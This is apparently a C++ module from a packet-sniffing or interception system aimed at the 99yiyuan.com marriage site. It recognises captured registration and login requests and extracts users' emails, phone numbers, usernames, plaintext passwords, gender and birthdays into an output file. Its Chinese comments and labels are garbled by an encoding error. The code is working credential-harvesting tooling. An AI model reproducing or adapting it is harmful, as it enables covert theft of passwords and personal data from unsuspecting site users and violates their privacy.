#include "StdAfx.h"
#include "MarriageYiYuanWang.h"

marriage::YiYuanWangMarriage::YiYuanWangMarriage(HttpSession *http_session, const string &pro_name) : Marriage(http_session,pro_name)
{
	app_ = "��Ե��";	
}

marriage::YiYuanWangMarriage::~YiYuanWangMarriage()
{
	
}

int marriage::YiYuanWangMarriage::IsYiYuanWangMarriage(HttpSession *http_session)
{
	//��ҳע��
	if((http_session->m_Requestline.m_Host.Find("www.99yiyuan.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/index.php?c=passport")!=-1)&&
		(http_session->m_Requestline.m_Referer.Find("http://www.99yiyuan.com/passport/reg.html")!=-1)) 
	{
		return kPcWebRegister;
	}
	//��ҳ��¼
	if((http_session->m_Requestline.m_Host.Find("www.99yiyuan.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/index.php?c=passport")!=-1)&&
		(http_session->m_Requestline.m_Referer.Find("http://www.99yiyuan.com/index.php")!=-1)) 
	{
		return kPcWebLogin;
	}
	return 0;
}

int marriage::YiYuanWangMarriage::Process(const char *packet,int action)
{
	//��ҳע��
	if (action == kPcWebRegister)
	{
		return PcWebRegister(packet);
	}
	//��ҳ��¼
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}

	return 1;
}
//��ҳע��
int marriage::YiYuanWangMarriage::PcWebRegister(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//����
	string email = ms_->GetValueFromMapByKey("email",true);
	//�ֻ���
	string phone = ms_->GetValueFromMapByKey("mobile",true);
	//����
	string password = ms_->GetValueFromMapByKey("password",true);
	//�û���
	string username = ms_->GetValueFromMapByKey("username",true);
	//�Ա�
	string sex = ms_->GetValueFromMapByKey("gender",true)=="1"?"��":"Ů";
	//��������
	string birhday = ms_->GetValueFromMapByKey("ageyear",true) + "-" +
		             ms_->GetValueFromMapByKey("agemonth",true) + "-"+
					 ms_->GetValueFromMapByKey("ageday",true);
	if (email.empty())
	{
		output_text_ =
		    "oid=" +phone + "\r\n" +             //�ֻ���
            "pass=" + password + "\r\n" +        //����
			"user=" +username + "\r\n" +         //�û���
			"sex=" +sex + "\r\n" +               //�Ա�
			"onick=" + birhday + "\r\n" +        //��������
 			"netmark=" + app_ + "\r\n" + 	     //��Դ
			"clientmsg=" + platformWeb + "\r\n" +//����ƽ̨
			"state=ע��\r\n";			         //״̬
		WriteIndexFile();
	}
	else
	{
		output_text_ =
			"nick=" + email + "\r\n" +           //�ֻ���
            "pass=" + password + "\r\n" +        //����
			"user=" +username + "\r\n" +         //�û���
			"sex=" +sex + "\r\n" +               //�Ա�
			"onick=" + birhday + "\r\n" +        //��������
			"netmark=" + app_ + "\r\n" + 	     //��Դ
			"clientmsg=" + platformWeb + "\r\n" +//����ƽ̨
			"state=ע��\r\n";			         //״̬
		WriteIndexFile();
	}
	return 1;
}

//web��¼
int marriage::YiYuanWangMarriage::PcWebLogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	string mobile = ms_->GetValueFromMapByKey("mobile",true);
	string pwd = ms_->GetValueFromMapByKey("password",true);
	string loginname = ms_->GetValueFromMapByKey("loginname",true);
	if (mobile.empty())
	{
		output_text_ =
			"user=" + loginname + "\r\n" +         //�û���
			"pass=" + pwd + "\r\n" +               //����
			"netmark=" + app_ + "\r\n" + 		   //��Դ
			"clientmsg=" + platformWeb + "\r\n" +  //����ƽ̨
			"state=��¼\r\n";			           //״̬
       	WriteIndexFile();
	}
	else
	{
		output_text_ =
			"user=" + mobile + "\r\n" +           //�û���
			"pass=" + pwd + "\r\n" +               //����
			"netmark=" + app_ + "\r\n" + 		   //��Դ
			"clientmsg=" + platformWeb + "\r\n" +  //����ƽ̨
			"state=��¼\r\n";			           //״̬
       	WriteIndexFile();
	}
	return 1;
}
